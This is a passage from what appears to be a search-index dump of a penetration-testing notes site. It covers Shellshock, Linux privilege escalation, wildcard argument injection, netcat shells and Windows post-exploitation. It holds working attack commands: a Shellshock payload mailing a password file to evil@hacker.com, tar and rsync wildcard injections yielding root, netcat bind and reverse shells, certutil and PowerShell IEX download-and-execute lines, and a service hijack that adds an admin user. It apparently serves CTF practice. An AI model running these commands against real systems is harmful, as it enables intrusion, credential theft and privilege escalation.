evil@hacker.com () { :; }; cat ~/.secret/passwd | mail -s This password file evil@hacker.com","title":"Samples"},{"location":"os/linux/important-issues/#exploitation-vectors","text":"Ref: https://github.com/opsxcq/exploit-CVE-2014-6271","title":"Exploitation Vectors"},{"location":"os/linux/important-issues/#cgi","text":"Bash will receive the environment variables passed by the server Server passes various details of the request to a handler program in the environment variable list. For example, HTTP_USER_AGENT . exploit/multi/http/apache_mod_cgi_bash_env_exec Apache mod_cgi - 'Shellshock' Remote Command Injection","title":"CGI"},{"location":"os/linux/important-issues/#openssh","text":"ForceCommand will execute a fixed command on login If user specify a command to run, user specific command is put into environment ( SSH_ORIGINAL_COMMAND ) Bash will parse SSH_ORIGINAL_COMMAND on start-up, and run the commands","title":"OpenSSH"},{"location":"os/linux/important-issues/#dhcp-clients","text":"Some DHCP clients can also pass commands to Bash Malicious DHCP server provide, a string crafted to execute code (in an addition option)","title":"DHCP clients"},{"location":"os/linux/important-issues/#qmail-server","text":"Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash.","title":"Qmail server"},{"location":"os/linux/important-issues/#ibm-hmc-restricted-shell","text":"","title":"IBM HMC restricted shell"},{"location":"os/linux/important-issues/#references","text":"Shellshock: How does it actually work? [Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability","title":"References"},{"location":"os/linux/important-issues/#practice","text":"https://pentesterlab.com/exercises/cve-2014-6271 [Docker] Shellshock exploit + vulnerable environment HTB - Shocker","title":"Practice"},{"location":"os/linux/important-issues/#cve-2014-7169","text":"","title":"CVE-2014-7169"},{"location":"os/linux/important-issues/#cve-2014-0160-heartbleed","text":"Exploits: - https://github.com/sensepost/heartbleed-poc","title":"CVE-2014-0160 - Heartbleed"},{"location":"os/linux/important-issues/#references_1","text":"https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/","title":"References"},{"location":"os/linux/important-issues/#cve-2016-4971-gnu-wget-118-arbitrary-file-upload-remote-code-execution","text":"issuing a crafted HTTP 30X Redirect containing FTP server reference in response wget will automatically follow the redirect wget will download a malicious file from the FTP server (to current dir) wget will fail to rename the file to the originally requested filename will not work with -O However, By saving .wgetrc in /home/victim/.wgetrc could set arbitrary wget settings such as destination directory Exploits: - https://www.exploit-db.com/exploits/40064","title":"CVE-2016-4971 - GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution"},{"location":"os/linux/important-issues/#openssh-66-sftp-misconfiguration","text":"Exploit: - https://github.com/SECFORCE/sftp-exploit References: - https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/ Practice: - HTB - Nightmare","title":"OpenSSH &lt;=6.6 SFTP misconfiguration"},{"location":"os/linux/important-issues/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"os/linux/important-issues/#cve-2010-0832-linux-pam-11x-motd-file-tampering","text":"pam_motd (aka the MOTD module) in libpam-modules Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory. \"user file stamps\" and the motd.legal-notice file. Exploits: - https://www.exploit-db.com/exploits/14339 - https://www.exploit-db.com/exploits/14273 - https://twitter.com/jonoberheide/status/18009527979 Practice: - HTB - Popcorn","title":"CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering"},{"location":"os/linux/important-issues/#cve-2015-5602-sudoedit-unauthorized-privilege-escalation","text":"RHEL 5/6/7 / Ubuntu Sudo = 1.8.14 When /etc/sudoers reads: user_to_grant_priv ALL=(root) NOPASSWD: sudoedit /home/*/*/test.txt Sudoedit does not check the full path if a wildcard is used twice (e.g. /home/ / /file.txt), Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow). Example: - /home/ user_to_grant_priv /newdir , test.txt pointing to /etc/shadow - ln -sf /etc/shadow /home/ user_to_grant_priv /newdir/test.txt - Then do sudoedit /home/ user_to_grant_priv /newdir/test.txt - OR sudoedit -u user_to_grant_priv /home/ user_to_grant_priv /newdir/test.txt - https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh Usages: - Expose /etc/shadow - Expose \u200bauthorized_keys over HTTP cd /var/www/testing/writeup ln -s /home/alekos/.ssh/authorized_keys layout.html References: - https://www.exploit-db.com/exploits/37710 Practice: - https://github.com/t0kx/privesc-CVE-2015-5602 - HTB - Jocker","title":"CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation"},{"location":"os/linux/important-issues/#cve-2016-7545-selinux-sandbox-escape","text":"When executing a program via the SELinux sandbox The nonpriv session can escape to the parent session By using the TIOCSTI ioctl to push characters into the terminal's input buffer #include unistd.h #include sys/ioctl.h int main() { char *cmd = id\\n ; while(*cmd) ioctl(0, TIOCSTI, cmd++); execlp( /bin/id , id , NULL); } $ gcc test.c -o test $ /bin/sandbox ./test id References - https://seclists.org/oss-sec/2016/q3/606","title":"CVE-2016-7545 - SELinux sandbox escape"},{"location":"os/linux/important-issues/#cve-2017-1000112-ufo-linux-kernel","text":"Ubuntu Trusty 4.4.0-* Ubuntu Xenial 4-8-0-* Ubuntu Xenial (16.04) 4.4.0-81 References: - https://www.openwall.com/lists/oss-security/2017/08/13/1 - https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html Exploit: - https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 Practice: - HTB - Nightmare","title":"CVE-2017-1000112 - UFO Linux kernel"},{"location":"os/linux/kernel-exploitation/","text":"Kernel Exploitation References Point of no C3 | Linux Kernel Exploitation https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585 https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850","title":"Kernel Exploitation"},{"location":"os/linux/kernel-exploitation/#kernel-exploitation","text":"","title":"Kernel Exploitation"},{"location":"os/linux/kernel-exploitation/#references","text":"","title":"References"},{"location":"os/linux/kernel-exploitation/#point-of-no-c3-linux-kernel-exploitation","text":"https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585 https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850","title":"Point of no C3 | Linux Kernel Exploitation"},{"location":"os/linux/privilege-escalation/","text":"Privilege Escalation Tools BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux unix-privesc-check: https://github.com/pentestmonkey/unix-privesc-check linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py LinEnum - https://github.com/rebootuser/LinEnum File Permissions Check file permissions of /etc/passwd and /etc/shadow Find writable files find -type f -maxdepth 1 -writable Generate password hash (md5): openssl passwd -1 echo 'joske' | openssl passwd -1 -stdin Generate password hash (sha256): python -c import crypt; print crypt.crypt('joske') SUID / SGID Binaries Find SUID find $DIRECTORY -perm /4000 Find GUID find $DIRECTORY -perm /2000 Find SUID / SGID find $DIRECTORY -perm /6000 Find and ls SUID / SGID find $DIRECTORY -perm /6000 -exec ls -la {} \\; Searching world writable files find / -perm -w ~ -type l -ls 2?/dev/null Plain text username / password grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find . -name *.php -print0 | xargs -0 grep -i -n var $password # Joomla Commands with sudo sudo -l New file Permissions umask Exploits Mempodipper compiled (Ubuntu 11 - gimmeroot.c) Ubuntu ( = 18.10) - Dirty Sock: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html https://github.com/initstring/dirty_sock/ Ubuntu 14.04 and 16.04: (CVE-2017-1000112) https://cxsecurity.com/issue/WLB-2018010018 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) https://www.exploit-db.com/exploits/14339 HTB: Beep GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154 - Nice example for learning exploit writing overlayfs Linux Kernel 3.13.0 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: https://www.exploit-db.com/exploits/37292 Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): https://www.exploit-db.com/exploits/39166 Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): https://www.exploit-db.com/exploits/39230 References Linux Local Privilege Escalation via SUID /proc/pid/mem Write - https://git.zx2c4.com/CVE-2012-0056/about/ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt","title":"Privilege Escalation"},{"location":"os/linux/privilege-escalation/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"os/linux/privilege-escalation/#tools","text":"BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux unix-privesc-check: https://github.com/pentestmonkey/unix-privesc-check linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py LinEnum - https://github.com/rebootuser/LinEnum","title":"Tools"},{"location":"os/linux/privilege-escalation/#file-permissions","text":"Check file permissions of /etc/passwd and /etc/shadow Find writable files find -type f -maxdepth 1 -writable Generate password hash (md5): openssl passwd -1 echo 'joske' | openssl passwd -1 -stdin Generate password hash (sha256): python -c import crypt; print crypt.crypt('joske')","title":"File Permissions"},{"location":"os/linux/privilege-escalation/#suid-sgid-binaries","text":"Find SUID find $DIRECTORY -perm /4000 Find GUID find $DIRECTORY -perm /2000 Find SUID / SGID find $DIRECTORY -perm /6000 Find and ls SUID / SGID find $DIRECTORY -perm /6000 -exec ls -la {} \\;","title":"SUID / SGID Binaries"},{"location":"os/linux/privilege-escalation/#searching-world-writable-files","text":"find / -perm -w ~ -type l -ls 2?/dev/null","title":"Searching world writable files"},{"location":"os/linux/privilege-escalation/#plain-text-username-password","text":"grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find . -name *.php -print0 | xargs -0 grep -i -n var $password # Joomla","title":"Plain text username / password"},{"location":"os/linux/privilege-escalation/#commands-with-sudo","text":"sudo -l","title":"Commands with sudo"},{"location":"os/linux/privilege-escalation/#new-file-permissions","text":"umask","title":"New file Permissions"},{"location":"os/linux/privilege-escalation/#exploits","text":"Mempodipper compiled (Ubuntu 11 - gimmeroot.c) Ubuntu ( = 18.10) - Dirty Sock: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html https://github.com/initstring/dirty_sock/ Ubuntu 14.04 and 16.04: (CVE-2017-1000112) https://cxsecurity.com/issue/WLB-2018010018 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) https://www.exploit-db.com/exploits/14339 HTB: Beep GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154 - Nice example for learning exploit writing","title":"Exploits"},{"location":"os/linux/privilege-escalation/#overlayfs","text":"Linux Kernel 3.13.0 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: https://www.exploit-db.com/exploits/37292 Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): https://www.exploit-db.com/exploits/39166 Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): https://www.exploit-db.com/exploits/39230","title":"overlayfs"},{"location":"os/linux/privilege-escalation/#references","text":"Linux Local Privilege Escalation via SUID /proc/pid/mem Write - https://git.zx2c4.com/CVE-2012-0056/about/ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt","title":"References"},{"location":"os/linux/wildcards/","text":"Wildcards Char Description * Any number of characters, including none. ? Any single character. [ ] Set of characters, any one of which may match a single character at that position. - Used within [ ] denotes a range of characters. ~ At the beginning of a word expands to the name of your home directory. If you append another user's login name to the character, it refers to that user's home directory. Using wildcard to inject arguments # ls -al drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR1 drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR2 -rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file1.txt -rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file2.txt -rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf # rm * # ls -al -rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf # strace rm * execve( /bin/rm , [ rm , DIR1 , DIR2 , file1.txt , file2.txt , -rf ], [/* 25 vars */]) = 0 chown --reference=RFILE use RFILE's owner and group rather than specifying OWNER:GROUP values # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17:35 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php # chown -R nobody:nobody *.php # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php -rw-rw-r--. 1 leon leon 117 Oct 28 17:35 inc.php -rw-rw-r--. 1 leon leon 111 Oct 28 17:38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php chmod --reference=RFILE use RFILE's mode instead of MODE values # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00:40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00:41 --reference=.drf.php # chmod 000 * # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00:40 .drf.php -rwxrwxrwx. 1 user user 117 Oct 28 17:36 inc.php -rwxrwxrwx. 1 user user 111 Oct 28 17:38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00:41 --reference=.drf.php tar command Execution --checkpoint[=NUMBER] display progress messages every NUMBERth record (default 10) --checkpoint-action=ACTION execute ACTION on each checkpoint # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 19:19 --checkpoint=1 -rw-r--r--. 1 leon leon 0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh -rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php -rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh # tar cf archive.tar * uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Rcync command Execution -e, --rsh=COMMAND specify the remote shell to use --rsync-path=PROGRAM specify the rsync to run on remote machine # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17:36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17:38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c # rsync -t *.c foo:src/ rsync: connection unexpectedly closed (0 bytes received so far) [sender] rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8] # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17:36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17:38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c -rw-r--r--. 1 root root 101 Mar 28 04:49 shell_output.txt # cat shell.c /usr/bin/id shell_output.txt # cat shell_output.txt uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Practice HTB - Joker Usage Create a script, setuid bit and then use this attack to chown the script to gain prev-esc","title":"Wildcards"},{"location":"os/linux/wildcards/#wildcards","text":"Char Description * Any number of characters, including none. ? Any single character. [ ] Set of characters, any one of which may match a single character at that position. - Used within [ ] denotes a range of characters. ~ At the beginning of a word expands to the name of your home directory. If you append another user's login name to the character, it refers to that user's home directory.","title":"Wildcards"},{"location":"os/linux/wildcards/#using-wildcard-to-inject-arguments","text":"# ls -al drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR1 drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR2 -rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file1.txt -rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file2.txt -rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf # rm * # ls -al -rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf # strace rm * execve( /bin/rm , [ rm , DIR1 , DIR2 , file1.txt , file2.txt , -rf ], [/* 25 vars */]) = 0","title":"Using wildcard to inject arguments"},{"location":"os/linux/wildcards/#chown","text":"--reference=RFILE use RFILE's owner and group rather than specifying OWNER:GROUP values # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17:35 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php # chown -R nobody:nobody *.php # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php -rw-rw-r--. 1 leon leon 117 Oct 28 17:35 inc.php -rw-rw-r--. 1 leon leon 111 Oct 28 17:38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php","title":"chown"},{"location":"os/linux/wildcards/#chmod","text":"--reference=RFILE use RFILE's mode instead of MODE values # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00:40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00:41 --reference=.drf.php # chmod 000 * # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00:40 .drf.php -rwxrwxrwx. 1 user user 117 Oct 28 17:36 inc.php -rwxrwxrwx. 1 user user 111 Oct 28 17:38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00:41 --reference=.drf.php","title":"chmod"},{"location":"os/linux/wildcards/#tar-command-execution","text":"--checkpoint[=NUMBER] display progress messages every NUMBERth record (default 10) --checkpoint-action=ACTION execute ACTION on each checkpoint # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 19:19 --checkpoint=1 -rw-r--r--. 1 leon leon 0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh -rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php -rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh # tar cf archive.tar * uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023","title":"tar command Execution"},{"location":"os/linux/wildcards/#rcync-command-execution","text":"-e, --rsh=COMMAND specify the remote shell to use --rsync-path=PROGRAM specify the rsync to run on remote machine # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17:36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17:38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c # rsync -t *.c foo:src/ rsync: connection unexpectedly closed (0 bytes received so far) [sender] rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8] # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17:36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17:38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c -rw-r--r--. 1 root root 101 Mar 28 04:49 shell_output.txt # cat shell.c /usr/bin/id shell_output.txt # cat shell_output.txt uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023","title":"Rcync command Execution"},{"location":"os/linux/wildcards/#practice","text":"HTB - Joker","title":"Practice"},{"location":"os/linux/wildcards/#usage","text":"Create a script, setuid bit and then use this attack to chown the script to gain prev-esc","title":"Usage"},{"location":"os/linux/x-Defense/","text":"Defense References PAM vs NSS: https://serverfault.com/questions/538383/understand-pam-and-nss/ Support to authenticate against PostgreSQL for PAM-enabled appliations: https://github.com/pam-pgsql/pam-pgsql Tools Locally checks for signs of a rootkit: http://www.chkrootkit.org/ Checklists Linux hardening checklist: https://github.com/trimstray/linux-hardening-checklist Kernel hardning checklist: https://github.com/a13xp0p0v/kconfig-hardened-check","title":"Defense"},{"location":"os/linux/x-Defense/#defense","text":"","title":"Defense"},{"location":"os/linux/x-Defense/#references","text":"PAM vs NSS: https://serverfault.com/questions/538383/understand-pam-and-nss/ Support to authenticate against PostgreSQL for PAM-enabled appliations: https://github.com/pam-pgsql/pam-pgsql","title":"References"},{"location":"os/linux/x-Defense/#tools","text":"Locally checks for signs of a rootkit: http://www.chkrootkit.org/","title":"Tools"},{"location":"os/linux/x-Defense/#checklists","text":"Linux hardening checklist: https://github.com/trimstray/linux-hardening-checklist Kernel hardning checklist: https://github.com/a13xp0p0v/kconfig-hardened-check","title":"Checklists"},{"location":"os/linux/tools/iptables/","text":"Iptables Count packets sent and received iptables -Z iptables -F iptables -I INPUT 1 -s IP -j ACCEPT iptables -I OUTOUT 1 -d IP -j ACCEPT ip tables -vn -L","title":"Iptables"},{"location":"os/linux/tools/iptables/#iptables","text":"","title":"Iptables"},{"location":"os/linux/tools/iptables/#count-packets-sent-and-received","text":"iptables -Z iptables -F iptables -I INPUT 1 -s IP -j ACCEPT iptables -I OUTOUT 1 -d IP -j ACCEPT ip tables -vn -L","title":"Count packets sent and received"},{"location":"os/linux/tools/netcat/","text":"Netcat (NC) nc -nv ip port Chat nc -nlvp 4444 nc -nv ip 4444 File Transfer nc -nlvp 4444 file.exe nc -nv ip 4444 file.exe Bind Shell VICTIM (server) nc -lvp 4444 -e cmd.exe ATTACKER (client) nc -nv IP Address 4444 Reverse Shell ATTACKER (server) nc -lvp 4444 VICTIM (client) nc -nv IP Address 4444 -e cmd.exe NCAT for increased security VICTIM (server) ncat -lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl ATTACKER (client) ncat -nv IP Address 4444 --ssl Port Scanning with NC TCP Connect Port Scan nc -nvv -w 1 -z ip 1-65550 UDP Scan nc -unvv -w 1 -z ip 1-65550","title":"Netcat (NC)"},{"location":"os/linux/tools/netcat/#netcat-nc","text":"nc -nv ip port","title":"Netcat (NC)"},{"location":"os/linux/tools/netcat/#chat","text":"nc -nlvp 4444 nc -nv ip 4444","title":"Chat"},{"location":"os/linux/tools/netcat/#file-transfer","text":"nc -nlvp 4444 file.exe nc -nv ip 4444 file.exe","title":"File Transfer"},{"location":"os/linux/tools/netcat/#bind-shell","text":"VICTIM (server) nc -lvp 4444 -e cmd.exe ATTACKER (client) nc -nv IP Address 4444","title":"Bind Shell"},{"location":"os/linux/tools/netcat/#reverse-shell","text":"ATTACKER (server) nc -lvp 4444 VICTIM (client) nc -nv IP Address 4444 -e cmd.exe","title":"Reverse Shell"},{"location":"os/linux/tools/netcat/#ncat-for-increased-security","text":"VICTIM (server) ncat -lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl ATTACKER (client) ncat -nv IP Address 4444 --ssl","title":"NCAT for increased security"},{"location":"os/linux/tools/netcat/#port-scanning-with-nc","text":"TCP Connect Port Scan nc -nvv -w 1 -z ip 1-65550 UDP Scan nc -unvv -w 1 -z ip 1-65550","title":"Port Scanning with NC"},{"location":"os/linux/tools/tcpdump/","text":"tcpdump Packet Capture tcpdump tcp dst [ip] [port] and tcp dst [ip] [port] tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 Open a PCAP tcpdump -\u00adr password_cracking_filtered.pcap Cut only IP addresses from the traffic tcpdump -\u00adr password_cracking_filtered.pcap | awk-\u00ad\u2010F '{print $3}' | sort -\u00ad\u2010u | head Filter Destination or Source tcpdump -n src host ip -\u00adr password_cracking_filtered.pcap tcpdump -n dst host ip \u2010r password_cracking_filtered.pcap tcpdump -n port port -\u00adr password_cracking_filtered.pcap Advanced Header Filtering tcpdump -A -n 'tcp[13] = 24' -\u00ad\u2010r password_cracking_filtered.pcap Other important flags -nn stop DNS and service names lookup (performance+) -X and -XX can be used to print each packet in hex and ascii -A print packets in ASCII -S to print absolute sequence numbers -s can be used to increase the default snap-length from 262144 to higher -s 0 to capture full packet","title":"tcpdump"},{"location":"os/linux/tools/tcpdump/#tcpdump","text":"","title":"tcpdump"},{"location":"os/linux/tools/tcpdump/#packet-capture","text":"tcpdump tcp dst [ip] [port] and tcp dst [ip] [port] tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21","title":"Packet Capture"},{"location":"os/linux/tools/tcpdump/#open-a-pcap","text":"tcpdump -\u00adr password_cracking_filtered.pcap","title":"Open a PCAP"},{"location":"os/linux/tools/tcpdump/#cut-only-ip-addresses-from-the-traffic","text":"tcpdump -\u00adr password_cracking_filtered.pcap | awk-\u00ad\u2010F '{print $3}' | sort -\u00ad\u2010u | head","title":"Cut only IP addresses from the traffic"},{"location":"os/linux/tools/tcpdump/#filter-destination-or-source","text":"tcpdump -n src host ip -\u00adr password_cracking_filtered.pcap tcpdump -n dst host ip \u2010r password_cracking_filtered.pcap tcpdump -n port port -\u00adr password_cracking_filtered.pcap","title":"Filter Destination or Source"},{"location":"os/linux/tools/tcpdump/#advanced-header-filtering","text":"tcpdump -A -n 'tcp[13] = 24' -\u00ad\u2010r password_cracking_filtered.pcap","title":"Advanced Header Filtering"},{"location":"os/linux/tools/tcpdump/#other-important-flags","text":"-nn stop DNS and service names lookup (performance+) -X and -XX can be used to print each packet in hex and ascii -A print packets in ASCII -S to print absolute sequence numbers -s can be used to increase the default snap-length from 262144 to higher -s 0 to capture full packet","title":"Other important flags"},{"location":"os/linux/tools/vi/","text":"VI Run command ':r /etc/bandit_pass/bandit26' ':e /etc/bandit_pass/bandit26' :set shell sh=/bin/bash :sh","title":"VI"},{"location":"os/linux/tools/vi/#vi","text":"","title":"VI"},{"location":"os/linux/tools/vi/#run-command","text":"':r /etc/bandit_pass/bandit26' ':e /etc/bandit_pass/bandit26' :set shell sh=/bin/bash :sh","title":"Run command"},{"location":"os/macos/x-Defense/","text":"Defense Tools xnumon - monitor macOS for malicious activity: https://github.com/droe/xnumon","title":"Defense"},{"location":"os/macos/x-Defense/#defense","text":"","title":"Defense"},{"location":"os/macos/x-Defense/#tools","text":"xnumon - monitor macOS for malicious activity: https://github.com/droe/xnumon","title":"Tools"},{"location":"os/windows/0-cheatsheed/","text":"Cheatsheet Moving files Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html certutil -verifyctl -split -f \u200b http://10.10.14.8/taskkill.exe mv *.bin taskkill.exe Extract ZIP Add-Type -assembly 'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory ( C:\\backup.zip , C:\\Example\\ ) View File Systems gdr -PSProvider 'FileSystem' Access shared volume net use y: \\\\10.10.10.57\\c$ /user:administrator 1234test Invoke command with credentials $user = '.\\administrator'; $psw = '1234test'; $secpsw = ConvertTo-SecureString $psw -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpsw invoke-command -computername localhost -credential $credential -scriptblock {cd C:\\Users\\Administrator\\Desktop\\;C:\\Users\\Administrator\\Desktop\\root.exe} Alternate Data Stream Listing: dir /R Find Streams: \u200bget-item -path *.* -stream * Reading: \u200bpowershell Get-Content -Path \"hm.txt\" -Stream \"root.txt\" Reading: get-content backup.zip -stream 'pass' Reading: streams.exe /accepteula -s from sysinternals MSI Installing MSI msiexec /quiet /qn /i malicious.msi /quiet = Suppress any messages to the user during installation /qn = No GUI /i = Regular (vs. administrative) installation Services Registry entries: HKLM\\SYSTEM\\CurrentControlSet\\Services View service properties: sc qc \"Vulnerable Service\" Restarting: sc stop \"Vulnerable Service\" Service information: Get-Service\u200b \u200b \"Ubiquiti UniFi Video\"\u200b | fl * Restart PC: shutdown /r /t 0 Change binary path: sc config \"Vulnerable Service\" binpath= \"net user eviladmin P4ssw0rd@ /add Keep alive When a service starts in Windows operating systems, it must communicate with the Service Control Manager . If it\u2019s not, Service Control Manager will terminates the process. Auto Save Password to PowerShell reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword \u200b$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)\u200b Start-Process -FilePath powershell -argumentlist IEX(New-Object Net.webClient).downloadString('http:// LAB IP /writeup') -Credential $creds Permissions whoami /priv View Permisions cacls C:\\Users\\Administrator\\Desktop\\root.txt Grant Permissions cacls C:\\Users\\Administrator\\Desktop\\root.txt /grant Alfred:F SSH from Windows to Attacker (Kali) Manual From Windows: plink.exe -l root -pw -R 445:127.0.0.1:445 10.10.14.8 From Attacker: netstat -ano | grep 445 winexe -U Administrator //127.0.0.1 cmd.exe Metasploit portfwd add -l 445 -p 445 -r 127.0.0.1 use exploit/windows/smb/psexec set SMBDOMAIN CHATTERBOX set SMBUSER Administrators set SMBPASS Welcome1! set RHOST 127.0.0.1 exploit","title":"Cheatsheet"},{"location":"os/windows/0-cheatsheed/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"os/windows/0-cheatsheed/#moving-files","text":"Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html certutil -verifyctl -split -f \u200b http://10.10.14.8/taskkill.exe mv *.bin taskkill.exe","title":"Moving files"},{"location":"os/windows/0-cheatsheed/#extract-zip","text":"Add-Type -assembly 'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory ( C:\\backup.zip , C:\\Example\\ )","title":"Extract 